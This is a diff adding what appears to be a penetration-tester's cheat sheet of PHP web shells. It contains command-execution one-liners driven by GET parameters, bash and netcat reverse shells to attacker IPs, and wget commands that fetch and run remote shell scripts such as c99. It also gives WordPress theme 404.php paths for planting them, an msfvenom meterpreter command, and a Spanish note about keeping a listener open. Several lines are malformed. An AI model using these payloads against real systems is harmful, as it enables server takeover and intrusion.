@@ -1,0 +1,22 @@
+<?php echo shell-exec('id; uname -a;ls'); ?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.0.XXX/80 0>&1'"); ?>
+<?php system($_GET[cmd]);?>
+<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.10.x.x/4444 0>&1’”);
+<?php system("cd /tmp; wget ht/shell.txt;mv shell.txt shell.php;chmod +x shell.php; php shell.php");?>
+<?php system("cd /tmp; wget http://ip/shell.txt;mv shell.txt shell.php;chmod +x shell.php; php shell.php");?>
+wp-content/twentyseventeen/404.php
+wp-content/themes/themename/404.php
+msfvenon -p php/meterpreter/reverse_tcp lhost lport -f raw
+https://www.hackingarticles.in/wordpress-reverse-shell/
+
+<?PHP SYSTEM("CD /TMP; WGET HTTP://IP/1.PHP;chmod +z 1.php; php 1.php");?>  hay que tener un nc a la escucha ya que
+esto se esta descargando en la ruta y ejecutando
+<?php system("cd /tmp; wget c.99.php; chmod +x c99.php; cp 99.php /var/www/imh/c99.php")?>
+<?php echo shell_exec('id; uname -a; ls'); ?>
+<?php echo shell_Exec('ls; cd img; mkdir test'); ?>
+<?php echo shell_Exec('ls; cd img ; wget shell.txt -o shell.php');?
+<?php system("wget httt -O /tmp/shell.php;php /tmp/shell.php");?>
+<php echo shell_exec($_GET['cmd']);?>
+1313:/file_view.php
+<?php system("nc 192.168.1.7 1234 -e /bin/bash")?>
+<?php system("ifconfig")?>
